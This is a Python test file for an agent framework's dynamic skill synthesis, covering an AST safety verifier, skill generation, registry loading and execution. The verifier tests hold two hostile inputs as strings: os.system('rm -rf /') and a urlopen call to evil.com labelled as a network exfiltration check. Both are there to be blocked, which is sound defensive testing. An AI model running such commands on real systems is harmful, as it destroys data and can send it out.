"""
Test SkillMakerAgent & Custom Skill Synthesis (Phase 6.3)
Run: python -m omni_v2.tests.test_skill_synthesis
"""

import asyncio
import sys
import time
from pathlib import Path

# Ensure repo root
REPO_ROOT = Path(__file__).resolve().parent.parent.parent
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

from omni_v2.skills import SkillVerifier, get_skill_maker, get_skill_registry
from omni_v2.agents import ExecutorAgent, MonitorAgent, EvaluatorAgent
from omni_v2.core import PluginManager, ActionStep
from omni_v2.core.intent_mapper import IntentMapper

def test_skill_synthesis():
    print("="*65)
    print("  OMNI V3 - PHASE 6.3: DYNAMIC SKILL SYNTHESIS & REGISTRATION")
    print("="*65)

    # 1. Test AST Safety Verifier blocks destructive injections
    print("\n1. Testing AST Safety Verifier against shell injections...")
    safe_rm, msg_rm = SkillVerifier.verify("import os\nos.system('rm -rf /')")
    print(f"   [x] rm -rf check -> safe: {safe_rm} | msg: {msg_rm}")
    assert not safe_rm, "AST Verifier failed to block rm -rf"

    safe_net, msg_net = SkillVerifier.verify("import urllib.request\nurllib.request.urlopen('http://evil.com')")
    print(f"   [x] network exfil check -> safe: {safe_net} | msg: {msg_net}")
    assert not safe_net, "AST Verifier failed to block unauthorized network module"

    # 2. Test SkillMaker synthesis and saving
    print("\n2. Testing SkillMakerAgent synthesis for unknown goal...")
    maker = get_skill_maker()
    goal = "organize desktop files by extension"
    skill_file, synth_msg = maker.synthesize_skill(goal)
    print(f"   -> Synthesized File: {skill_file} | {synth_msg}")
    assert skill_file and skill_file.exists(), "SkillMaker failed to synthesize code file"

    # 3. Test SkillRegistry loading into PluginManager + FastAFStore
    print("\n3. Testing SkillRegistry dynamic loader & indexer...")
    pm = PluginManager()
    reg = get_skill_registry(pm)
    loaded_plugin = reg.load_skill_file(skill_file)
    print(f"   -> Loaded Plugin: {loaded_plugin.metadata.name} | Category: {loaded_plugin.metadata.category}")
    assert loaded_plugin is not None, "SkillRegistry failed to load synthesized python file"
    assert pm.get_plugin(loaded_plugin.metadata.name) is not None, "Plugin not found in PluginManager"

    # 4. Test closed-loop synthesis via Evaluator on unknown action
    print("\n4. Testing Evaluator closed-loop synthesis on unknown goal...")
    evaluator = EvaluatorAgent()
    step_unknown = ActionStep(
        action="unknown",
        entities={"text": "schedule a meeting with John tomorrow at 3pm"},
        original="schedule a meeting with John tomorrow at 3pm",
        description="Step 1: unknown",
        step_index=1
    )
    refined = evaluator.replan(step_unknown.original, step_unknown, {"error_message": "Plugin not found for action 'unknown'"})
    print(f"   -> Evaluator Re-Plan -> {len(refined)} steps | action={refined[0].action}")
    assert len(refined) == 1 and refined[0].action.startswith("custom_"), f"Did not synthesize custom skill, got {refined[0].action}"

    # 5. Test execution of newly synthesized skill
    print("\n5. Executing synthesized custom skill via ExecutorAgent...")
    executor = ExecutorAgent(pm)
    t0 = time.perf_counter()
    res = asyncio.run(executor.execute_step(refined[0]))
    lat_exec = (time.perf_counter() - t0) * 1000.0
    print(f"   -> Execution Result ({lat_exec:.2f}ms): success={res.success} | {res.message}")
    assert res.success, "Custom skill execution failed"

    # 6. Test instant continuous learning via SemanticRouter / Fast AF DB (<1.5 ms)
    print("\n6. Testing continuous learning (Turn 2 Semantic Lookup via Fast AF DB)...")
    t1 = time.perf_counter()
    mapper = IntentMapper()
    matched_name, score = mapper.match("schedule a meeting with John tomorrow at 3pm")
    lat_match = (time.perf_counter() - t1) * 1000.0
    print(f"   -> Turn 2 Match ({lat_match:.2f}ms): matched_name='{matched_name}' | score={score:.2f}")
    assert matched_name == refined[0].action, f"Expected {refined[0].action}, got {matched_name}"

    print("\n✅ PHASE 6.3 DYNAMIC SKILL SYNTHESIS: 100% PASSED (Continuous Mastery Achieved)")
    print("="*65)

if __name__ == "__main__":
    test_skill_synthesis()
